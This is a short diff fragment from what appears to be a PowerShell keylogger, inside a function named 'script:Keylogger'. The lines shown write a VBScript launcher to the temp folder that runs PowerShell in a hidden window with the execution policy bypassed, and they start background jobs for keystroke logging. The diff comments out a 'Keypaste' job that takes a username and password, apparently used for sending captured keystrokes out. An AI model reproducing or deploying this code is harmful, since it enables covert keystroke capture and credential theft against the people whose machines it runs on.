@@ -281,6 +281,6 @@ function script:Keylogger
 	echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
 	echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
 
-	start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1]} -ArgumentList @($username,$password)
+	#start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1]} -ArgumentList @($username,$password)
 	start-job -InitializationScript $functions -scriptblock {Keylogger}
 
